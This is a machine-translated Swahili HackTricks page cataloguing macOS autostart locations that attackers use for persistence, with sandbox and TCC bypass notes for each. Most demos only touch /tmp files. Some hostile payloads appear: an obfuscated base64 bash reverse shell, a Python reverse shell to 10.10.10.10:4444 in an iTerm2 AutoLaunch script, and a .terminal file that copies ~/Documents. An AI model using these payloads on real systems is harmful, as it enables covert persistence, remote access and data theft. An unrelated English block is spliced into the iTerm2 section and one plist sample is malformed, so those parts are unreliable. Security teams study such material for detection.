# Kuanza kiotomatiki kwa macOS

<details>

<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **fuata** sisi kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

Sehemu hii inategemea sana safu ya blogu [**Zaidi ya LaunchAgents nzuri**](https://theevilbit.github.io/beyond/), lengo ni kuongeza **Maeneo zaidi ya Kuanza Kiotomatiki** (ikiwezekana), kuonyesha **njia zipi bado zinafanya kazi** leo na toleo la hivi karibuni la macOS (13.4) na kueleza **ruhusa** inayohitajika.

## Kupuuza Sanduku la Mchanga

{% hint style="success" %}
Hapa unaweza kupata maeneo ya kuanza yanayofaa kwa **kupuuza sanduku la mchanga** ambayo inakuruhusu tu kutekeleza kitu kwa **kuandika kwenye faili** na **kungojea** kwa **kitendo cha kawaida sana**, kiasi cha wakati kilichopangwa au **kitendo unachoweza kawaida kufanya** kutoka ndani ya sanduku la mchanga bila kuhitaji ruhusa ya msingi.
{% endhint %}

### Launchd

* Inafaa kwa kupuuza sanduku la mchanga: [✅](https://emojipedia.org/check-mark-button)
* Kupuuza TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Maeneo

* **`/Library/LaunchAgents`**
* **Kitendo cha Kuanza**: Reboot
* Inahitaji Root
* **`/Library/LaunchDaemons`**
* **Kitendo cha Kuanza**: Reboot
* Inahitaji Root
* **`/System/Library/LaunchAgents`**
* **Kitendo cha Kuanza**: Reboot
* Inahitaji Root
* **`/System/Library/LaunchDaemons`**
* **Kitendo cha Kuanza**: Reboot
* Inahitaji Root
* **`~/Library/LaunchAgents`**
* **Kitendo cha Kuanza**: Kuingia tena
* **`~/Library/LaunchDemons`**
* **Kitendo cha Kuanza**: Kuingia tena

#### Maelezo & Udukuzi

**`launchd`** ni **mchakato wa kwanza** unaoendeshwa na kernel ya OX S wakati wa kuanza na wa mwisho kumaliza wakati wa kuzima. Daima inapaswa kuwa na **PID 1**. Mchakato huu utasoma na kutekeleza mipangilio iliyotajwa katika **plists ya ASEP** katika:

* `/Library/LaunchAgents`: Mawakala wa mtumiaji waliowekwa na msimamizi
* `/Library/LaunchDaemons`: Daemons za mfumo zilizowekwa na msimamizi
* `/System/Library/LaunchAgents`: Mawakala wa mtumiaji zinazotolewa na Apple.
* `/System/Library/LaunchDaemons`: Daemons za mfumo zinazotolewa na Apple.

Wakati mtumiaji anapoingia, plists zilizoko katika `/Users/$USER/Library/LaunchAgents` na `/Users/$USER/Library/LaunchDemons` zinaanza na **ruhusa za watumiaji walioingia**.

**Tofauti kuu kati ya mawakala na daemons ni kwamba mawakala hupakiwa wakati mtumiaji anaingia na daemons hupakiwa wakati wa kuanza kwa mfumo** (kwa kuwa kuna huduma kama ssh ambayo inahitaji kutekelezwa kabla ya mtumiaji yeyote kupata ufikiaji wa mfumo). Pia mawakala wanaweza kutumia GUI wakati daemons wanahitaji kukimbia kwenye hali ya nyuma.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
Kuna matukio ambapo **mawakala anahitaji kutekelezwa kabla ya mtumiaji kuingia**, haya huitwa **PreLoginAgents**. Kwa mfano, hii ni muhimu kutoa teknolojia ya msaada wakati wa kuingia. Wanaweza kupatikana pia katika `/Library/LaunchAgents` (ona [**hapa**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) mfano).

{% hint style="info" %}
Faili mpya za usanidi za Daemons au Agents zitapakia **baada ya kuanza upya au kutumia** `launchctl load <target.plist>` Pia ni **inawezekana kupakia faili za .plist bila kuwa na kipengee hicho** kwa kutumia `launchctl -F <file>` (hata hivyo faili hizo za plist hazitapakia moja kwa moja baada ya kuanza upya).\
Pia ni **inawezekana kufuta** kwa kutumia `launchctl unload <target.plist>` (mchakato ulionakiliwa na hiyo itakomeshwa),

Ili **kudhibitisha** kwamba hakuna **kitu** (kama kubadilisha) **kinazuia** **Mwakala** au **Daemon** **kutekelezwa** endesha: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`
{% endhint %}

Orodhesha mawakala na daemons wote waliopakiwa na mtumiaji wa sasa:
```bash
launchctl list
```
{% hint style="warning" %}
Ikiwa plist inamilikiwa na mtumiaji, hata kama iko katika folda za mfumo wa daemuni, **kazi itatekelezwa kama mtumiaji** na si kama root. Hii inaweza kuzuia baadhi ya mashambulizi ya uongezaji wa mamlaka.
{% endhint %}

### faili za kuanza kwa shell

Maelezo: [https://theevilbit.github.io/beyond/beyond\_0001/](https://theevilbit.github.io/beyond/beyond\_0001/)\
Maelezo (xterm): [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

* Inatumika kukiuka sanduku la mchanga: [✅](https://emojipedia.org/check-mark-button)
* Kukiuka TCC: [✅](https://emojipedia.org/check-mark-button)
* Lakini unahitaji kupata programu na kukiuka TCC ambayo inatekeleza shell ambayo inapakia faili hizi

#### Maeneo

* **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
* **Kitendo**: Fungua terminal na zsh
* **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
* **Kitendo**: Fungua terminal na zsh
* Inahitaji ruhusa ya root
* **`~/.zlogout`**
* **Kitendo**: Toka kwenye terminal na zsh
* **`/etc/zlogout`**
* **Kitendo**: Toka kwenye terminal na zsh
* Inahitaji ruhusa ya root
* Huenda kuna zaidi katika: **`man zsh`**
* **`~/.bashrc`**
* **Kitendo**: Fungua terminal na bash
* `/etc/profile` (haikufanya kazi)
* `~/.profile` (haikufanya kazi)
* `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
* **Kitendo**: Inatarajiwa kuzinduliwa na xterm, lakini **haiko imewekwa** na hata baada ya kuwekwa kosa hili linatokea: xterm: `DISPLAY is not set`

#### Maelezo & Utekaji

Wakati wa kuanzisha mazingira ya shell kama `zsh` au `bash`, **faili za kuanza zinatekelezwa**. macOS kwa sasa inatumia `/bin/zsh` kama shell ya msingi. Shell hii inafikiwa moja kwa moja wakati programu ya Terminal inazinduliwa au wakati kifaa kinapatawa kupitia SSH. Ingawa `bash` na `sh` pia zipo katika macOS, wanahitaji kuitwa wazi ili kutumika.

Ukurasa wa man wa zsh, ambao tunaweza kusoma kwa kutumia **`man zsh`** una maelezo marefu ya faili za kuanza.
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### Programu Zilizofunguliwa tena

{% hint style="danger" %}
Kuweka mazingira ya kutumia na kujiondoa na kuingia tena au hata kuzima haikufanya kazi kwangu kutekeleza programu. (Programu haikuwa inatekelezwa, labda inahitaji kuwa ikifanya kazi wakati hatua hizi zinatekelezwa)
{% endhint %}

**Maelezo**: [https://theevilbit.github.io/beyond/beyond\_0021/](https://theevilbit.github.io/beyond/beyond\_0021/)

* Inatumika kukiuka sanduku la mchanga: [✅](https://emojipedia.org/check-mark-button)
* Kukiuka TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

* **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
* **Kichocheo**: Kuanza upya kufungua tena programu

#### Maelezo na Utekaji

Programu zote za kufunguliwa tena ziko ndani ya plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`

Kwa hivyo, ili programu zilizofunguliwa tena ziweze kuzindua yako, unahitaji tu **kuongeza programu yako kwenye orodha**.

UUID inaweza kupatikana kwa kuorodhesha saraka hiyo au kwa kutumia `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Ili kuangalia programu zitakazofunguliwa tena unaweza kufanya:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
Ili **kuongeza programu kwenye orodha hii** unaweza kutumia:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Mapendeleo ya Terminali

* Inatumika kukiuka sanduku la mchanga: [✅](https://emojipedia.org/check-mark-button)
* Kukiuka TCC: [✅](https://emojipedia.org/check-mark-button)
* Matumizi ya Terminali kuwa na ruhusa za FDA za mtumiaji anayetumia

#### Mahali

* **`~/Library/Preferences/com.apple.Terminal.plist`**
* **Kichocheo**: Fungua Terminal

#### Maelezo na Utekaji

Katika **`~/Library/Preferences`** kuna mapendeleo ya mtumiaji katika Programu. Baadhi ya mapendeleo haya yanaweza kuwa na usanidi wa **kutekeleza programu/zana nyingine**.

Kwa mfano, Terminali inaweza kutekeleza amri wakati wa Kuanza:

<figure><img src="../.gitbook/assets/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Usanidi huu unajitokeza katika faili **`~/Library/Preferences/com.apple.Terminal.plist`** kama ifuatavyo:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
Jadi, ikiwa plist ya mapendeleo ya terminali katika mfumo inaweza kubadilishwa, basi **kazi ya `open`** inaweza kutumika **kufungua terminali na amri hiyo itatekelezwa**.

Unaweza kuongeza hii kutoka kwa cli kwa:

{% code overflow="wrap" %}
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
{% endcode %}

### Skripti za Terminali / Vipengele vingine vya faili

* Inatumika kukiuka sanduku la mchanga: [✅](https://emojipedia.org/check-mark-button)
* Kukiuka TCC: [✅](https://emojipedia.org/check-mark-button)
* Matumizi ya Terminali kuwa na ruhusa za FDA za mtumiaji anayetumia

#### Mahali

* **Mahali popote**
* **Kichocheo**: Fungua Terminali

#### Maelezo & Utekaji

Ikiwa utaunda skripti ya [**`.terminal`**](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) na kuifungua, programu ya **Terminali** itaitwa moja kwa moja kutekeleza amri zilizotajwa humo. Ikiwa programu ya Terminali ina ruhusa maalum (kama vile TCC), amri yako itatekelezwa na ruhusa hizo maalum.

Jaribu hili na:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
Unaweza pia kutumia vifaa vya **`.command`**, **`.tool`**, na maudhui ya skripti za kawaida za shell na zitafunguliwa na Terminal.

{% hint style="danger" %}
Ikiwa terminal ina **Upatikanaji Kamili wa Diski**, itakuwa na uwezo wa kukamilisha hatua hiyo (kumbuka kwamba amri iliyotekelezwa itaonekana kwenye dirisha la terminal).
{% endhint %}

### Programu za Sauti

Maelezo: [https://theevilbit.github.io/beyond/beyond\_0013/](https://theevilbit.github.io/beyond/beyond\_0013/)\
Maelezo: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

* Inatumika kukiuka sanduku la mchanga: [✅](https://emojipedia.org/check-mark-button)
* Kukiuka TCC: [🟠](https://emojipedia.org/large-orange-circle)
* Unaweza kupata ufikiaji wa ziada wa TCC

#### Mahali

* **`/Library/Audio/Plug-Ins/HAL`**
* Inahitajika mizizi
* **Kichocheo**: Anza upya coreaudiod au kompyuta
* **`/Library/Audio/Plug-ins/Components`**
* Inahitajika mizizi
* **Kichocheo**: Anza upya coreaudiod au kompyuta
* **`~/Library/Audio/Plug-ins/Components`**
* **Kichocheo**: Anza upya coreaudiod au kompyuta
* **`/System/Library/Components`**
* Inahitajika mizizi
* **Kichocheo**: Anza upya coreaudiod au kompyuta

#### Maelezo

Kulingana na maelezo ya awali, ni **inawezekana kuchakata programu za sauti** na kuzipakia.

### Programu za QuickLook

Maelezo: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)

* Inatumika kukiuka sanduku la mchanga: [✅](https://emojipedia.org/check-mark-button)
* Kukiuka TCC: [🟠](https://emojipedia.org/large-orange-circle)
* Unaweza kupata ufikiaji wa ziada wa TCC

#### Mahali

* `/System/Library/QuickLook`
* `/Library/QuickLook`
* `~/Library/QuickLook`
* `/Applications/AppNameHere/Contents/Library/QuickLook/`
* `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Maelezo & Utekaji

Programu za QuickLook zinaweza kutekelezwa unapopata **kielelezo cha awali cha faili** (bonyeza nafasi na faili iliyochaguliwa kwenye Finder) na **programu-jalizi inayounga mkono aina hiyo ya faili** imewekwa.

Inawezekana kuchakata programu yako mwenyewe ya QuickLook, iweke kwenye mojawapo ya maeneo yaliyotajwa hapo awali ili kuipakia kisha nenda kwenye faili inayoungwa mkono na bonyeza nafasi kuichokoza.

### ~~Vifungo vya Kuingia/Kutoka~~

{% hint style="danger" %}
Hii haikufanya kazi kwangu, wala na Kuingia kwa mtumiaji wala na Kutoka kwa mizizi
{% endhint %}

**Maelezo**: [https://theevilbit.github.io/beyond/beyond\_0022/](https://theevilbit.github.io/beyond/beyond\_0022/)

* Inatumika kukiuka sanduku la mchanga: [✅](https://emojipedia.org/check-mark-button)
* Kukiuka TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

* Unahitaji kuweza kutekeleza kitu kama `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
* `Ime`po katika `~/Library/Preferences/com.apple.loginwindow.plist`

Zimepitwa na wakati lakini zinaweza kutumika kutekeleza amri wakati mtumiaji anapoingia.
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
Hii mipangilio inahifadhiwa katika `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
Ili kufuta hiyo:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
Root user one imehifadhiwa katika **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Kizuizi cha Sanduku la Mchanga Kwa Masharti

{% hint style="success" %}
Hapa unaweza kupata maeneo ya kuanzia yanayofaa kwa **kizuizi cha sanduku la mchanga** ambacho kinakuwezesha kutekeleza kitu kwa **kuandika kwenye faili** na **kutarajia hali sio za kawaida** kama programu maalum zilizosanikishwa, hatua au mazingira ya mtumiaji "sio wa kawaida".
{% endhint %}

### Cron

**Maelezo**: [https://theevilbit.github.io/beyond/beyond\_0004/](https://theevilbit.github.io/beyond/beyond\_0004/)

* Inatumika kwa kizuizi cha sanduku la mchanga: [✅](https://emojipedia.org/check-mark-button)
* Hata hivyo, unahitaji kuweza kutekeleza `crontab` binary
* Au uwe root
* Kizuizi cha TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

* **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
* Root inahitajika kwa ufikiaji wa kuandika moja kwa moja. Hakuna root inayohitajika ikiwa unaweza kutekeleza `crontab <faili>`
* **Kichocheo**: Inategemea kazi ya cron

#### Maelezo & Utekaji

Pata orodha ya kazi za cron za **mtumiaji wa sasa** na:
```bash
crontab -l
```
Unaweza pia kuona kazi zote za cron za watumiaji katika **`/usr/lib/cron/tabs/`** na **`/var/at/tabs/`** (inahitaji ruhusa ya msingi).

Katika MacOS, folda kadhaa zinazotekeleza hati kwa **frekwensi fulani** zinaweza kupatikana katika:
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
Hapa ndipo unaweza kupata **kazi za cron** za kawaida, **kazi za at** (ambazo hazitumiwi sana) na **kazi za kipindi** (zinazotumiwa hasa kwa kusafisha faili za muda). Kazi za kipindi za kila siku zinaweza kutekelezwa kwa mfano na: `periodic daily`.

Kuongeza **programu ya kazi ya cron ya mtumiaji kiotomatiki** inawezekana kutumia:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Maelezo: [https://theevilbit.github.io/beyond/beyond\_0002/](https://theevilbit.github.io/beyond/beyond\_0002/)

* Inatumika kwa kuzidi sandbox: [✅](https://emojipedia.org/check-mark-button)
* Kizuizi cha TCC: [✅](https://emojipedia.org/check-mark-button)
* iTerm2 hutumika kuwa na ruhusa za TCC zilizoidhinishwa

#### Maeneo

* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
* **Kichocheo**: Fungua iTerm
* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
* **Kichocheo**: Fungua iTerm
* **`~/Library/Preferences/com.googlecode.iterm2.plist`**
* **Kichocheo**: Fungua iTerm

#### Maelezo & Utekaji

Scripts zilizohifadhiwa katika **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** zitatekelezwa. Kwa mfano:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
### macOS Auto Start Locations

#### Launch Agents

Launch Agents are used to run processes when a user logs in. They are located in `~/Library/LaunchAgents/` and `/Library/LaunchAgents/`.

#### Launch Daemons

Launch Daemons are used to run processes at system boot or login. They are located in `/Library/LaunchDaemons/` and `/System/Library/LaunchDaemons/`.

#### Login Items

Login Items are applications that open when a user logs in. They can be managed in `System Preferences > Users & Groups > Login Items`.
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
Skripti **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** pia itatekelezwa:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
Faili za mapendeleo ya iTerm2 zilizoko katika **`~/Library/Preferences/com.googlecode.iterm2.plist`** zinaweza **kuonyesha amri ya kutekeleza** wakati terminali ya iTerm2 inapo funguliwa.

Mazingira haya yanaweza kusanidiwa katika mipangilio ya iTerm2:

<figure><img src="../.gitbook/assets/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

Na amri inaonekana katika mapendeleo:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
Unaweza kuweka amri ya kutekelezwa kwa:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
{% endcode %}

{% hint style="warning" %}
Kuna uwezekano mkubwa wa kuwa **kuna njia nyingine za kutumia mipangilio ya iTerm2** kutekeleza amri za kupindukia.
{% endhint %}

### xbar

Maelezo: [https://theevilbit.github.io/beyond/beyond\_0007/](https://theevilbit.github.io/beyond/beyond\_0007/)

* Inatumika kukiuka sanduku la mchanga: [✅](https://emojipedia.org/check-mark-button)
* Lakini xbar lazima iwe imewekwa
* Kizuizi cha TCC: [✅](https://emojipedia.org/check-mark-button)
* Inahitaji ruhusa ya Ufikivu

#### Mahali

* **`~/Library/Application\ Support/xbar/plugins/`**
* **Kichocheo**: Mara tu xbar inapoendeshwa

#### Maelezo

Ikiwa programu maarufu ya [**xbar**](https://github.com/matryer/xbar) imewekwa, inawezekana kuandika script ya shell katika **`~/Library/Application\ Support/xbar/plugins/`** ambayo itatekelezwa wakati xbar inapoanzishwa:
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Maelezo**: [https://theevilbit.github.io/beyond/beyond\_0008/](https://theevilbit.github.io/beyond/beyond\_0008/)

* Inatumika kwa kuzidi sandbox: [✅](https://emojipedia.org/check-mark-button)
* Lakini Hammerspoon lazima iwe imewekwa
* Kizuizi cha TCC: [✅](https://emojipedia.org/check-mark-button)
* Inahitaji ruhusa za Ufikivu

#### Mahali

* **`~/.hammerspoon/init.lua`**
* **Kichocheo**: Mara tu Hammerspoon inapoendeshwa

#### Maelezo

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) inafanya kazi kama jukwaa la kiotomatiki kwa **macOS**, ikiboresha **lugha ya skripti ya LUA** kwa shughuli zake. Kwa umuhimu, inasaidia uingizaji wa nambari kamili ya AppleScript na utekelezaji wa skripti za shell, ikiboresha uwezo wake wa skripti kwa kiasi kikubwa.

Programu hiyo inatafuta faili moja, `~/.hammerspoon/init.lua`, na wakati inapoanzishwa skripti itatekelezwa.
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

* Inatumika kukiuka sanduku la mchanga: [✅](https://emojipedia.org/check-mark-button)
* Lakini BetterTouchTool lazima iwe imewekwa
* Kukiuka TCC: [✅](https://emojipedia.org/check-mark-button)
* Inahitaji ruhusa za Ufikiaji wa Utoaji wa Utoaji na Ufikiaji wa Urahisi

#### Mahali

* `~/Library/Application Support/BetterTouchTool/*`

Chombo hiki huruhusu kuonyesha programu au hati za kutekelezwa wakati baadhi ya mkato unapigwa. Mshambuliaji anaweza kuweza kusanidi **mkato wake mwenyewe na hatua ya kutekeleza katika hifadhidata** ili kufanya kutekeleza nambari ya kupindukia (mkato unaweza kuwa tu kubonyeza kitufe).

### Alfred

* Inatumika kukiuka sanduku la mchanga: [✅](https://emojipedia.org/check-mark-button)
* Lakini Alfred lazima iwe imewekwa
* Kukiuka TCC: [✅](https://emojipedia.org/check-mark-button)
* Inahitaji ruhusa za Utoaji wa Utoaji, Urahisi na hata Ufikiaji wa Diski kamili

#### Mahali

* `???`

Inaruhusu kuunda mifumo ya kazi ambayo inaweza kutekeleza nambari wakati hali fulani zinakutana. Kimsingi inawezekana kwa mshambuliaji kuunda faili ya mfumo wa kazi na kufanya Alfred iipakie (inahitajika kulipa toleo la malipo kutumia mifumo ya kazi).

### SSHRC

Maelezo: [https://theevilbit.github.io/beyond/beyond\_0006/](https://theevilbit.github.io/beyond/beyond\_0006/)

* Inatumika kukiuka sanduku la mchanga: [✅](https://emojipedia.org/check-mark-button)
* Lakini ssh inahitaji kuwezeshwa na kutumiwa
* Kukiuka TCC: [✅](https://emojipedia.org/check-mark-button)
* SSH hutumia kupata Ufikiaji wa Diski kamili

#### Mahali

* **`~/.ssh/rc`**
* **Kichocheo**: Ingia kupitia ssh
* **`/etc/ssh/sshrc`**
* Inahitaji mizizi
* **Kichocheo**: Ingia kupitia ssh

{% hint style="danger" %}
Kugeuza ssh kuwasha kunahitaji Ufikiaji wa Diski kamili:
```bash
sudo systemsetup -setremotelogin on
```
{% endhint %}

#### Maelezo & Utekaji

Kwa chaguo-msingi, isipokuwa `PermitUserRC no` katika `/etc/ssh/sshd_config`, wakati mtumiaji **anapoingia kupitia SSH** hati **`/etc/ssh/sshrc`** na **`~/.ssh/rc`** zitatekelezwa.

### **Vitu vya Kuingia**

Andika: [https://theevilbit.github.io/beyond/beyond\_0003/](https://theevilbit.github.io/beyond/beyond\_0003/)

* Inatumika kukiuka sanduku la mchanga: [✅](https://emojipedia.org/check-mark-button)
* Lakini unahitaji kutekeleza `osascript` na vigezo
* Kukiuka TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Maeneo

* **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
* **Kichocheo:** Kuingia
* Malipo ya utekelezaji yaliyohifadhiwa yanaita **`osascript`**
* **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
* **Kichocheo:** Kuingia
* Inahitaji Mzizi

#### Maelezo

Katika Mapendeleo ya Mfumo -> Watumiaji & Vikundi -> **Vitu vya Kuingia** unaweza kupata **vitengo vitakavyotekelezwa wakati mtumiaji anapoingia**.\
Inawezekana kuziorodhesha, kuongeza na kuondoa kutoka kwenye mstari wa amri:
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
Hizi vitu hifadhiwa kwenye faili **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**

**Vitu vya kuingia** vinaweza **pia** kudhihirishwa kwa kutumia API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) ambayo itahifadhi usanidi katika **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**

### ZIP kama Kipengee cha Kuingia

(Angalia sehemu iliyopita kuhusu Vitu vya Kuingia, hii ni nyongeza)

Ikiwa unahifadhi faili ya **ZIP** kama **Kipengee cha Kuingia** **`Archive Utility`** itaifungua na ikiwa zip ilihifadhiwa kwa mfano katika **`~/Library`** na ilikuwa na Folda **`LaunchAgents/file.plist`** na mlango wa nyuma, folda hiyo itaundwa (haipo kwa chaguo-msingi) na plist itaongezwa ili wakati wa kuingia tena, **mlango wa nyuma ulioonyeshwa kwenye plist utatekelezwa**.

Chaguo lingine lingekuwa kuunda faili **`.bash_profile`** na **`.zshenv`** ndani ya nyumbani kwa mtumiaji hivyo ikiwa folda ya LaunchAgents tayari ipo hii mbinu bado itafanya kazi.

